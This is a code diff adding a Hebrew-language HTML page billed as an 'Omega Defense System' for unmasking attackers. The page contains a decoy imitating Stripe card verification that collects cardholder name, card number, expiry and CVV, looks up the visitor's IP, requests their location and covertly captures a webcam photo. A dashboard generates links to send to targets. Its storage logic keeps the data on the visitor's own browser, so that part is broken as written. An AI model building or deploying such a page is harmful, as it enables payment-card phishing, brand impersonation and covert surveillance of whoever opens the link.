@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omega Defense System</title>
+    <style>
+        :root { --bg: #0a0a0a; --card: #1a1a1a; --text: #e0e0e0; --accent: #00ff41; --danger: #ff003c; --border: #333; }
+        body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 0; }
+        
+        /* Master Access Portal */
+        #access-portal { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .terminal-text { color: var(--accent); margin-bottom: 20px; font-size: 1.5em; text-shadow: 0 0 5px var(--accent); }
+        
+        /* Dashboard Interface */
+        .dashboard { display: none; max-width: 600px; margin: 0 auto; padding-bottom: 80px; }
+        .header { background: #111; padding: 15px; border-bottom: 1px solid var(--border); text-align: center; font-weight: bold; color: var(--accent); position: sticky; top: 0; z-index: 100; }
+        
+        /* Control Panel (Stories) */
+        .control-bar { display: flex; padding: 15px; overflow-x: auto; gap: 20px; border-bottom: 1px solid var(--border); background: #151515; }
+        .control-item { text-align: center; cursor: pointer; min-width: 70px; }
+        .icon-circle { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--accent); display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 5px; background: #000; }
+        
+        /* Intel Feed */
+        .intel-post { background: var(--card); border-bottom: 5px solid #000; margin-bottom: 10px; border-left: 4px solid var(--accent); }
+        .intel-header { padding: 10px; font-size: 12px; border-bottom: 1px solid var(--border); color: #888; }
+        .intel-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; background: #000; display: block; }
+        .intel-body { padding: 15px; font-size: 13px; line-height: 1.6; }
+        .data-highlight { color: var(--accent); background: #003310; padding: 2px 5px; border-radius: 3px; }
+
+        /* Decoy Page (What the Attacker Sees) */
+        #decoy-page { display: none; background: #f4f4f4; color: #333; min-height: 100vh; font-family: Arial, sans-serif; }
+        .decoy-container { max-width: 400px; margin: 0 auto; padding: 40px 20px; text-align: center; }
+        .payment-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: right; }
+        .decoy-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        
+        .btn-active { background: var(--accent); color: #000; font-weight: bold; border: none; padding: 10px; border-radius: 5px; width: 100%; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div id="access-portal">
+    <div class="terminal-text">OMEGA_DEFENSE_V13_READY</div>
+    <input type="password" id="admin-pin" style="background:#000; border:1px solid var(--accent); color:var(--accent); padding:10px; text-align:center;" placeholder="ENTER SECURITY PIN">
+    <button onclick="unlockDashboard()" style="margin-top:20px; background:var(--accent); border:none; padding:10px 30px; cursor:pointer; font-weight:bold;">INITIALIZE</button>
+</div>
+
+<div id="decoy-page">
+    <div class="decoy-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" width="100" style="margin-bottom:20px;">
+        <div class="payment-box">
+            <h3 style="margin-top:0;">אימות תשלום מאובטח</h3>
+            <p style="font-size:14px; color:#666;">נדרש אימות כרטיס כדי להשלים את הפעולה האחרונה בחשבונך.</p>
+            <label>שם בעל הכרטיס</label>
+            <input type="text" id="cc_name" class="decoy-input" placeholder="ישראל ישראלי">
+            <label>מספר כרטיס אשראי</label>
+            <input type="tel" id="cc_num" class="decoy-input" placeholder="0000 0000 0000 0000">
+            <div style="display:flex; gap:10px;">
+                <input type="tel" id="cc_exp" class="decoy-input" placeholder="MM/YY">
+                <input type="tel" id="cc_cvv" class="decoy-input" placeholder="CVV">
+            </div>
+            <button onclick="triggerTrap()" style="background:#635bff; color:white; border:none; padding:15px; width:100%; border-radius:5px; font-weight:bold; cursor:pointer;">אמת כרטיס כעת</button>
+        </div>
+        <p style="font-size:12px; color:#999; margin-top:20px;">Protected by Stripe Security Engine System</p>
+    </div>
+</div>
+
+<div class="dashboard" id="admin-dashboard">
+    <div class="header">OMEGA INTELLIGENCE UNIT</div>
+    
+    <div class="control-bar">
+        <div class="control-item" onclick="generateLink()">
+            <div class="icon-circle">📡</div>
+            <span>קישור</span>
+        </div>
+        <div class="control-item" onclick="toggleDefenseKill()">
+            <div class="icon-circle" id="killIndicator">🛡️</div>
+            <span>הגנה</span>
+        </div>
+        <div class="control-item" onclick="location.reload()">
+            <div class="icon-circle">🔄</div>
+            <span>רענן</span>
+        </div>
+        <div class="control-item" onclick="clearLogs()">
+            <div class="icon-circle">☣️</div>
+            <span>מחק</span>
+        </div>
+    </div>
+
+    <div id="intel-feed">
+        <div style="text-align:center; padding:50px; color:#555;">SCANNING FOR THREATS...</div>
+    </div>
+</div>
+
+<video id="v" style="display:none" autoplay playsinline muted></video>
+<canvas id="c" style="display:none"></canvas>
+
+<script>
+    const KEY = "1234";
+    const DB = "omega_defense_vault";
+
+    function unlockDashboard() {
+        if(document.getElementById('admin-pin').value === KEY) {
+            document.getElementById('access-portal').style.display = 'none';
+            document.getElementById('admin-dashboard').style.display = 'block';
+            renderIntel();
+        }
+    }
+
+    // לוגיקה שרצה אצל התוקף
+    window.onload = () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        if(urlParams.has('secure_id')) {
+            document.getElementById('access-portal').style.display = 'none';
+            document.getElementById('decoy-page').style.display = 'block';
+            initForensics();
+        }
+    };
+
+    async function initForensics() {
+        // איסוף ראשוני: IP ומיקום
+        let intel = { id: Date.now(), time: new Date().toLocaleString(), ip: 'Scanning...', loc: 'Pending...', pic: '', card: 'None' };
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            intel.ip = (await r.json()).ip;
+        } catch(e){}
+        navigator.geolocation.getCurrentPosition(p => {
+            intel.loc = `${p.coords.latitude},${p.coords.longitude}`;
+        });
+        saveIntel(intel);
+        window.currentHunt = intel;
+    }
+
+    async function triggerTrap() {
+        const intel = window.currentHunt;
+        // איסוף פרטי "אשראי" שהתוקף הזין (לצרכי זיהוי)
+        const cc = `Name: ${document.getElementById('cc_name').value} | Num: ${document.getElementById('cc_num').value} | Exp: ${document.getElementById('cc_exp').value} | CVV: ${document.getElementById('cc_cvv').value}`;
+        intel.card = cc;
+
+        // הפעלת מצלמה ברגע הלחיצה
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1000));
+            const canvas = document.getElementById('c');
+            canvas.width = 600; canvas.height = 600;
+            canvas.getContext('2d').drawImage(video, 0, 0, 600, 600);
+            intel.pic = canvas.toDataURL('image/jpeg', 0.5);
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e){}
+
+        saveIntel(intel);
+        alert("תקלה בשרת האימות. קוד שגיאה: 502. הגישה נחסמה.");
+        window.location.href = "https://www.google.com/search?q=security+breach+alert";
+    }
+
+    function saveIntel(data) {
+        let logs = JSON.parse(localStorage.getItem(DB) || '[]');
+        const idx = logs.findIndex(l => l.id === data.id);
+        if(idx > -1) logs[idx] = data; else logs.unshift(data);
+        localStorage.setItem(DB, JSON.stringify(logs));
+    }
+
+    function renderIntel() {
+        const logs = JSON.parse(localStorage.getItem(DB) || '[]');
+        if(logs.length === 0) return;
+        document.getElementById('intel-feed').innerHTML = logs.map(i => `
+            <div class="intel-post">
+                <div class="intel-header">TARGET_DETECTED • ${i.time}</div>
+                ${i.pic ? `<img src="${i.pic}" class="intel-img">` : '<div style="padding:40px; text-align:center; color:#444;">NO_VISUAL_FEED</div>'}
+                <div class="intel-body">
+                    <b>IP_ADDRESS:</b> <span class="data-highlight">${i.ip}</span><br>
+                    <b>COORDINATES:</b> <a href="https://www.google.com/maps?q=${i.loc}" target="_blank" style="color:var(--accent)">OPEN_GPS_MAP</a><br>
+                    <hr style="border:0; border-top:1px solid #333; margin:10px 0;">
+                    <b>COLLECTED_DATA:</b><br>
+                    <span style="color:var(--danger); font-family:monospace; font-size:11px;">${i.card}</span>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function generateLink() {
+        const link = window.location.href.split('?')[0] + "?secure_id=" + Math.random().toString(36).substr(2, 9);
+        navigator.clipboard.writeText(link);
+        alert("קישור ההגנה הועתק. שלח אותו לתוקף כדי לחשוף את זהותו.");
+    }
+</script>
+</body>
+</html>
